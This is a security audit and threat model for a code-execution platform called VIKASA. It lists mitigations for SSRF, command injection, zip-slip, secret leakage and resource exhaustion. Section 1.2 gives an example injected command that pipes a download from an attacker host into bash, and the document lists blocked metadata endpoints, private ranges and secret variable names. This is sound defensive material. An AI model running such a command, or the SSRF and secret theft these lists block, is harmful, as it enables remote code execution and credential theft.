# VIKASA — Security Review & Threat Mitigation Audit

**Audit Date:** 2026-10-25T08:40:00Z  
**Classification:** Critical Security Controls  
**Target:** Local Execution, Sandbox Isolation, & Cloud Hosting  

---

## 1. Threat Model & Mitigations

### 1.1 Server-Side Request Forgery (SSRF)
- **Threat:** Malicious Git URLs pointing to internal services (e.g. AWS metadata `http://169.254.169.254/latest/meta-data/` or internal Kubernetes cluster IPs `10.0.0.0/8`).
- **Mitigation Implemented:**
  - `ProjectAnalyzerService.validate_repository_url` performs multi-tier validation:
    1. Scheme check: only `http` and `https` allowed.
    2. Hostname check: rejects `localhost`, `127.0.0.1`, `::1`, `metadata.google.internal`, `instance-data`.
    3. DNS resolution & IP subnet filtering against `_BLOCKED_NETWORKS`:
       - `127.0.0.0/8` (IPv4 loopback)
       - `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16` (RFC 1918 private)
       - `169.254.0.0/16` (AWS/Cloud link-local metadata)
       - `0.0.0.0/8`, `::1/128`, `fc00::/7`, `fe80::/10` (IPv6 private/link-local)
  - Verified by 6 dedicated tests in `test_project_intelligence.py` and `test_backend_audit_hardening.py`.

### 1.2 Remote Code Execution (RCE) via Subprocess Runner
- **Threat:** Untrusted repository commands or user inputs executing arbitrary shell code (e.g. `pytest; curl attacker.com/leak | bash`).
- **Mitigation Implemented:**
  - Shell execution (`shell=True`) is completely forbidden.
  - Strict binary whitelist: only `python`, `pytest`, and `git` are permitted.
  - Command line validation rejects shell metacharacters: `&`, `|`, `;`, `>`, `<`, `` ` ``, `$`, `\n`, `\r`.
  - Arguments are passed as discrete tokenized lists to `subprocess.Popen`.
  - Process tree termination via `psutil` or `taskkill` ensures background daemons cannot persist past timeout.
  - Bounded execution timeout (default: 30 seconds).

### 1.3 Directory Traversal & Zip-Slip Protection
- **Threat:** Filenames or archive entries containing `../` or absolute paths (`/etc/passwd`, `C:\Windows\System32`) to overwrite system files during archive extraction or repository inspection.
- **Mitigation Implemented:**
  - `validate_safe_path`: Uses `os.path.realpath` and `os.path.commonpath` to verify all inspected or written files are strictly contained within the intended project root.
  - Archive Extraction Guard (`safe_extract_archive`): Validates every member path in `.zip` / `.tar.gz` before extraction, rejecting any path containing `..` or absolute drive roots.
  - UNC paths (`\\server\share`) and DOS reserved device names (`CON`, `NUL`, `AUX`, `COM1`, `LPT1`) are explicitly blocked.

### 1.4 Credential & Secret Leaks
- **Threat:** Leaking environment secrets, API tokens, or SSH keys through subprocess environment inheritance or execution logs.
- **Mitigation Implemented:**
  - Environment variable sanitization removes `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `GITHUB_TOKEN`, `GITHUB_API_TOKEN`, `DATABASE_URL`, `OLLAMA_API_KEY`.
  - Regex-based output credential scrubber replaces bearer tokens, GitHub personal access tokens (`ghp_...`), private keys (`-----BEGIN PRIVATE KEY-----`), and database passwords with safe `[REDACTED_...]` placeholders.
  - Secrets are never logged or stored in plain-text task records.

### 1.5 Rate Limiting & Resource Exhaustion (DoS)
- **Threat:** Large file uploads, infinite recursion in directory trees, or CPU hogging via recursive analysis.
- **Mitigation Implemented:**
  - Maximum inspected files capped at 500.
  - Maximum inspected file size capped at 256 KB.
  - Archive upload file size capped at 50 MB.
  - Excluded paths automatically ignored: `.git`, `node_modules`, `venv`, `dist`, `build`, `.next`, `__pycache__`.
  - Subprocess output buffers capped at 512 KB to prevent out-of-memory crashes.

### 1.6 Authentication & Authorization
- **Design:**
  - API Key / Bearer token validation required on state-mutating endpoints.
  - Human approval gate enforced in database state machine: tasks in `PLANNED` state cannot transition to `RUNNING` without a recorded human approval event (`POST /api/tasks/{id}/approve`).
